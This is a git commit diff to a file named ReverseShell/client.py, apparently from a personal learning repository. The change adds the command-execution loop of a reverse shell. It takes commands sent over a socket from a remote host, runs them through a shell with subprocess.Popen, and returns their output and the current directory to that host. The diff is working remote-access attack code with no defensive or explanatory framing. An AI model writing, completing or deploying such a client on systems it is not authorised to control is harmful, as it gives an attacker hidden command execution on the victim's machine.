891e29c819008fb34cafdd5df7f4f95041d7d770
Sallar <106476322+sallar-ba@users.noreply.github.com>
2022-12-11 13:34:39 +0500

    Adding Functionality to Client Script)

--- ReverseShell/client.py
+++ ReverseShell/client.py
@@ -11,4 +11,22 @@ s.connect((host, port))
 while True:
     data = s.recv(1024)
     if data[:2].decode("utf-8") == 'cd':
+        # Changing Directory
         os.chdir(data[3:].decode("utf-8"))
+
+    # If There is a Command
+    if len(data) > 0:
+        # Popen - Opens a Process
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
+                               stdout=subprocess.PIPE,
+                               stderr=subprocess.PIPE,
+                               stdin=subprocess.PIPE)
+        outputByte = cmd.stdout.read() + cmd.stderr.read()
+        outputString = str(outputByte, 'utf-8')
+
+        currWorkingDir = os.getcwd() + "> "
+        s.send(str.encode(outputString + currWorkingDir))
+
+        print(outputString)
+
+
